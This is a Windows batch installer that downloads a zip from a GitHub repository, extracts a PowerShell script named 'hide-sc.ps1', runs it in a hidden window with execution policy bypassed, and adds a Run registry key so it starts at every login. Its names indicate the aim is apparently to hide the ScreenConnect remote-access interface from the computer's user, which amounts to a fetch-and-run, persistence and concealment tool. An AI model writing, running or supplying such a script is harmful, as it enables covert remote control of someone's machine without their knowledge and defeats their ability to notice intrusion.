@echo off
setlocal EnableExtensions

set "ZIP_URL=https://github.com/chanelwolthuis-del/hidezip/archive/refs/heads/main.zip"
set "BASE_DIR=C:\Tools"
set "GITHUB_DIR=%BASE_DIR%\hidezip-main"
set "INSTALL_DIR=%BASE_DIR%\hide"
set "ZIP_FILE=%TEMP%\hide-github.zip"
set "INNER_ZIP=%GITHUB_DIR%\hide-sc.zip"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "REGKEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "VAL=HideScreenConnectUI"
set "SCRIPT=%INSTALL_DIR%\hide-sc.ps1"

echo [1/4] Downloading...
curl -L -o "%ZIP_FILE%" "%ZIP_URL%"
if errorlevel 1 goto :fail

echo [2/4] Extracting...
if not exist "%BASE_DIR%" mkdir "%BASE_DIR%"
"%PS%" -NoProfile -Command "Expand-Archive -LiteralPath '%ZIP_FILE%' -DestinationPath '%BASE_DIR%' -Force"
if errorlevel 1 goto :fail

if not exist "%INNER_ZIP%" goto :fail
if exist "%INSTALL_DIR%" rmdir /s /q "%INSTALL_DIR%"
mkdir "%INSTALL_DIR%"
"%PS%" -NoProfile -Command "Expand-Archive -LiteralPath '%INNER_ZIP%' -DestinationPath '%INSTALL_DIR%' -Force"
if errorlevel 1 goto :fail

if not exist "%SCRIPT%" goto :fail

echo [3/4] Starting hider...
start "" /B "%PS%" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%SCRIPT%"

echo [4/4] Installing at login (Registry)...
reg add "%REGKEY%" /v "%VAL%" /t REG_SZ /d "\"%PS%\" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%SCRIPT%\"" /f
if errorlevel 1 goto :fail

echo.
echo SUCCESS - Installed to %INSTALL_DIR%
echo Runs automatically at every login.
exit /b 0

:fail
echo FAILED - check paths and re-upload hide-sc.zip to GitHub
exit /b 1
